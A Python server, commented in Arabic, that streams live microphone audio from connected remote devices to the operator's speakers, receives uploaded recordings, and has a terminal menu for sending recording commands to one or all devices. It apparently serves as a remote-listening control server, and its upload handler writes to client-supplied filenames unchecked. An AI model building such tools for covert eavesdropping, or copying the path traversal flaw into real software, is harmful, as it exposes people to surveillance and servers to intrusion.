import asyncio
import json
import os
import logging
import threading
from datetime import datetime

# استيراد مكتبات الويب والصوت
import websockets
from aiohttp import web
import pyaudio # <-- المكتبة الجديدة للاستماع الفوري

# --- إعدادات أساسية ---
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s | %(levelname)-8s | %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)

HOST = '0.0.0.0'
PORT = 5000
UPLOADS_DIR = "uploads"
# لم نعد بحاجة لمجلد البث المباشر، ولكن يمكن إبقاؤه
LIVE_STREAMS_DIR = "live_streams"

# --- إعدادات الصوت (يجب أن تتطابق مع التطبيق) ---
CHUNK = 1024
FORMAT = pyaudio.paInt16  # يتوافق مع 16-bit PCM
CHANNELS = 1
RATE = 44100

# --- إدارة الحالة المشتركة والآمنة بين الخيوط ---
CLIENTS = {}
CLIENTS_LOCK = threading.Lock()

# --- التهيئة الأولية لنظام الصوت ---
p = pyaudio.PyAudio()

# --- دوال مساعدة ---
def ensure_directories_exist():
    os.makedirs(UPLOADS_DIR, exist_ok=True)
    os.makedirs(LIVE_STREAMS_DIR, exist_ok=True) # اختياري الآن
    logging.info(f"Storage directories are ready: '{UPLOADS_DIR}/'")

async def send_json(websocket, data):
    try:
        await websocket.send(json.dumps(data))
    except websockets.ConnectionClosed:
        pass

# --- معالج خادم الـ HTTP (لرفع الملفات) - بدون تغيير ---
async def handle_upload(request):
    reader = await request.multipart()
    field = await reader.next()
    if field and field.name == 'file':
        filename = field.filename
        if not filename: return web.Response(text="Filename is required", status=400)
        filepath = os.path.join(UPLOADS_DIR, filename)
        try:
            with open(filepath, 'wb') as f:
                while True:
                    chunk = await field.read_chunk()
                    if not chunk: break
                    f.write(chunk)
            logging.info(f"✅ [HTTP] File received and saved successfully: {filename}")
            return web.json_response({"status": "success"}, status=200)
        except Exception as e:
            logging.error(f"❌ [HTTP] Error while saving file {filename}: {e}")
            return web.Response(text=f"Server error: {e}", status=500)
    return web.Response(text="Could not find 'file' part", status=400)

# --- معالج خادم الـ WebSocket (مع تعديلات الاستماع) ---

async def websocket_handler(websocket, path):
    client_id = websocket.remote_address
    logging.info(f"Client connected: {client_id}")
    with CLIENTS_LOCK:
        CLIENTS[websocket] = {"state": "idle", "stream": None, "id": client_id}

    try:
        async for message in websocket:
            # 1. إذا كانت الرسالة بيانات صوتية ثنائية
            if isinstance(message, bytes):
                with CLIENTS_LOCK:
                    client_state = CLIENTS.get(websocket)
                if client_state and client_state["state"] == "live_streaming":
                    audio_stream = client_state.get("stream")
                    if audio_stream:
                        # !! هنا يتم تشغيل الصوت مباشرة !!
                        audio_stream.write(message)
                continue

            # 2. إذا كانت الرسالة أمرًا نصيًا
            try:
                data = json.loads(message)
                command = data.get("command")
                logging.info(f"Received command '{command}' from {client_id}")

                if command == "streaming_start":
                    handle_streaming_start(websocket)
                elif command == "streaming_end":
                    handle_streaming_end(websocket)

            except Exception as e:
                logging.error(f"❌ Error processing message from {client_id}: {e}")

    except websockets.ConnectionClosed as e:
        logging.info(f"Client disconnected: {client_id} (Code: {e.code})")
    finally:
        handle_streaming_end(websocket) # تنظيف الموارد عند الانقطاع
        with CLIENTS_LOCK:
            if websocket in CLIENTS:
                del CLIENTS[websocket]

def handle_streaming_start(websocket):
    """
    يعالج أمر بدء البث بفتح قناة صوتية إلى السماعات.
    """
    with CLIENTS_LOCK:
        client_state = CLIENTS.get(websocket)
        if not client_state or client_state["state"] != "idle":
            logging.warning(f"⚠️ {websocket.remote_address} tried to start streaming while not idle.")
            return

        try:
            # فتح قناة صوتية جديدة للتشغيل الفوري
            audio_stream = p.open(format=FORMAT,
                                  channels=CHANNELS,
                                  rate=RATE,
                                  output=True,
                                  frames_per_buffer=CHUNK)

            client_state["state"] = "live_streaming"
            client_state["stream"] = audio_stream

            logging.info(f"🎤 [LIVE] الاستماع الفوري مفعل للعميل {websocket.remote_address}. يتم إرسال الصوت إلى السماعات.")
        except Exception as e:
            logging.error(f"❌ Failed to open audio stream: {e}")

def handle_streaming_end(websocket):
    """
    يعالج أمر إيقاف البث بإغلاق القناة الصوتية.
    """
    with CLIENTS_LOCK:
        client_state = CLIENTS.get(websocket)
        if client_state and client_state["state"] == "live_streaming":
            audio_stream = client_state.get("stream")
            if audio_stream:
                audio_stream.stop_stream()
                audio_stream.close()
                logging.info(f"✔️ [LIVE] تم إيقاف قناة الاستماع الفوري للعميل {websocket.remote_address}")

            client_state["state"] = "idle"
            client_state["stream"] = None

# --- واجهة التحكم النصية (CLI) - بدون تغيير في المنطق ---
def command_line_interface(loop):
    while True:
        print("\n===== Server Control Panel =====")
        print("1: List connected devices")
        print("2: Send command to a specific device")
        print("3: Send command to all devices (Broadcast)")
        print("==============================")
        try:
            choice = input("Enter your choice: ")
            if choice == '1': list_connected_devices()
            elif choice == '2': send_command_to_specific_device(loop)
            elif choice == '3': broadcast_command_to_all_devices(loop)
            else: print("Invalid choice. Please try again.")
        except (KeyboardInterrupt, EOFError): break
        except Exception as e: logging.error(f"[CLI] Error: {e}")

def list_connected_devices():
    with CLIENTS_LOCK:
        if not CLIENTS:
            print("\n-> No connected devices.")
            return
        print("\n--- Connected Devices ---")
        for i, ws in enumerate(CLIENTS.keys()):
            info = CLIENTS[ws]
            print(f"  [{i}]: {info.get('id')} - State: {info.get('state')}")
        print("-----------------------")

def send_command_to_specific_device(loop):
    list_connected_devices()
    with CLIENTS_LOCK: clients_list = list(CLIENTS.keys())
    if not clients_list: return
    try:
        idx = int(input("Enter device index: "))
        if not 0 <= idx < len(clients_list):
            print("Invalid device index.")
            return
        command = input("Enter command (e.g., start_live_stream): ")
        data = {"command": command}
        if command == "start_timed_recording":
             duration = input("Enter duration in ms (e.g., 30000): ")
             data["duration"] = int(duration)
        target_ws = clients_list[idx]
        asyncio.run_coroutine_threadsafe(send_json(target_ws, data), loop)
        print(f"Scheduled '{command}' for device index {idx}.")
    except (ValueError, IndexError): print("Invalid input.")

def broadcast_command_to_all_devices(loop):
    with CLIENTS_LOCK:
        if not CLIENTS:
            print("\n-> No connected devices.")
            return
        all_ws = list(CLIENTS.keys())
    command = input("Enter command to broadcast: ")
    data = {"command": command}
    for ws in all_ws:
        asyncio.run_coroutine_threadsafe(send_json(ws, data), loop)
    print(f"Scheduled '{command}' for {len(all_ws)} devices.")

# --- دالة التشغيل الرئيسية ---
async def main():
    ensure_directories_exist()
    loop = asyncio.get_running_loop()
    cli_thread = threading.Thread(target=command_line_interface, args=(loop,), daemon=True)
    cli_thread.start()

    http_app = web.Application()
    http_app.router.add_post("/upload", handle_upload)
    runner = web.AppRunner(http_app)
    await runner.setup()
    http_site = web.TCPSite(runner, HOST, PORT + 1)

    websocket_server = await websockets.serve(websocket_handler, HOST, PORT)

    logging.info(f"🚀 WebSocket server is running on ws://{HOST}:{PORT}")
    logging.info(f"🚀 HTTP file upload server is running on http://{HOST}:{PORT + 1}/upload")
    logging.info("Server is ready... Control interface is active in the terminal.")

    await asyncio.gather(
        websocket_server.wait_closed(),
        http_site.start()
    )

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logging.info("Server stopped.")
    finally:
        # التأكد من إنهاء نظام الصوت عند إغلاق الخادم
        p.terminate()